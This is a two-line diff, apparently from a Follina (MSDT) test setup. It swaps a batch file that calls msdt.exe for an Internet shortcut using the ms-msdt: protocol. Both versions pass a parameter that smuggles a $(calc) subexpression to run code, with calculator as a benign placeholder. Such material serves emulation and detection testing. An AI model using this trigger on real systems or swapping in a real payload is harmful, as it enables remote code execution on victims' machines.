@@ -1,2 +1,2 @@
-echo msdt.exe /id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=h]$(calc)i/telemet.exe" > C:\FollinaTest\go.bat
-C:\FollinaTest\go.bat
+[InternetShortcut]
+URL=ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=h]$(calc)i/telemet.exe"
